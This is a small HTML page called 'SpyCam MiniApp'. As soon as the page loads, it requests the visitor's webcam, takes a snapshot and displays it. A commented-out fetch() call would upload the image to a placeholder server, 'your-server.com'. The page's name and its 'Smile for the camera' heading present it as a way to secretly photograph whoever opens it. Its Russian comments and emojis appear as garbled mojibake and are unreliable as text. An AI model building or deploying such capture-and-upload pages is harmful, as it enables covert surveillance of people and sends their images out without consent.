<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SpyCam MiniApp</title>
  <style>
    body { margin: 0; font-family: sans-serif; text-align: center; background: #111; color: white; }
    video, canvas, img { max-width: 100%; margin-top: 10px; }
    #video { display: block; }
  </style>
</head>
<body>
  <h2>Smile for the camera üòà</h2>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display: none;"></canvas>
  <img id="photo" alt="Captured image will appear here">

  <script>
    async function capture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        await new Promise(resolve => video.onloadedmetadata = resolve);

        // –ù–µ–º–Ω–æ–≥–æ –ø–æ–¥–æ–∂–¥—ë–º, —á—Ç–æ–±—ã –∫–∞–º–µ—Ä–∞ —Ç–æ—á–Ω–æ —É—Å–ø–µ–ª–∞ –≤–∫–ª—é—á–∏—Ç—å—Å—è
        await new Promise(res => setTimeout(res, 700));

        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
        stream.getTracks().forEach(track => track.stop());

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ñ–æ—Ç–æ
        const photo = document.getElementById('photo');
        photo.src = canvas.toDataURL('image/png');

        // –£–±–∏—Ä–∞–µ–º –≤–∏–¥–µ–æ
        video.style.display = 'none';

        // –ï—Å–ª–∏ –Ω—É–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–æ—Ç–æ:
        /*
        fetch('https://your-server.com/upload', {
          method: 'POST',
          body: JSON.stringify({ image: photo.src }),
          headers: { 'Content-Type': 'application/json' }
        });
        */

      } catch (err) {
        document.body.innerHTML = '<h2>‚ùå –ö–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞</h2>';
        console.error(err);
      }
    }

    window.onload = capture;
  </script>
</body>
</html>
